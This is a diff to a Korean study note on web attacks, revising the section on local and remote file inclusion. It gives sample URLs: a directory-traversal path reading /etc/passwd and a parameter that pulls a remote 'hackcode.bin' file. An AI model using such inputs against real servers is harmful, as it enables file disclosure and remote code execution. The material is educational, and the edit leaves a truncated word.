@@ -156,7 +156,7 @@
 ----------------------------------------------------------------------
 
 ## 16. 파일 삽입(File Inclusion) 공격
-#### 파일 삽입 공격에는 Local FI와 Remote FI가 있다. LFI는 Directory Traversal 취약점을 주로 이용해 브라우저로 웹서버의 특정 경로에 접근해 디렉토리를 이동한다. URL로 예를 들자면 _ht<span>tp://exa</span>mple.com/index.php?file=../../../../etc/passwd_ 등의 형태를 띈다. RFI는 URL 인자를 이용해 외부(원격) 웹서버의 파일에 접근하는 공격이다. URL로 예를 들자면 _ht<span>tp://exam</span>ple.com/index.php?language=ht<span>tp://te</span>st.com/hackcode.bin_ 등의 형태를 띈다.
+#### 파일 삽입 공격에는 Local FI와 Remote FI가 있다. LFI는 Directory Traversal 취약점을 주로 이용해 서버 내 존재하는 파일이 포함되어 노출시키는 것을 말한다. 라우저로 웹서버의 특정 경로에 접근해 디렉토리를 이동한다. URL로 예를 들자면 _ht<span>tp://exa</span>mple.com/index.php?file=../../../../etc/passwd_ 등의 형태를 띈다. RFI는 URL 인자를 이용해 외부(원격) 웹서버의 파일에 접근하는 공격이다. URL로 예를 들자면 _ht<span>tp://exam</span>ple.com/index.php?language=ht<span>tp://te</span>st.com/hackcode.bin_ 등의 형태를 띈다.
 
 * 참고: <https://hive.blog/kr/@huti/phpmyadmin-file-inclusion-cve-2018-12613>
 
